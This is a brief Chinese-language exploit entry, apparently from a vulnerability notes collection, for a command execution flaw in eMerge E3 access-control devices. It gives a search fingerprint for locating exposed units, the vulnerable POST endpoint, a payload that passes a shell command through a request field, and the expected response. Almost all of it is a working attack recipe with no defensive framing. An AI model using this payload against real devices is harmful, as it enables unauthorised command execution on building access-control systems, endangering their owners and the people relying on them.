# eMergeE3execute.php存在命令执行漏洞

eMergeE3execute.php ｜ 命令执行 ｜ —
- **指纹**：`title="emerge"`
- **请求**：`POST /diagnostic/controller/execute.php HTTP/1.1`

**Payload**
```
action=execute&command=id
```
- **响应特征**：200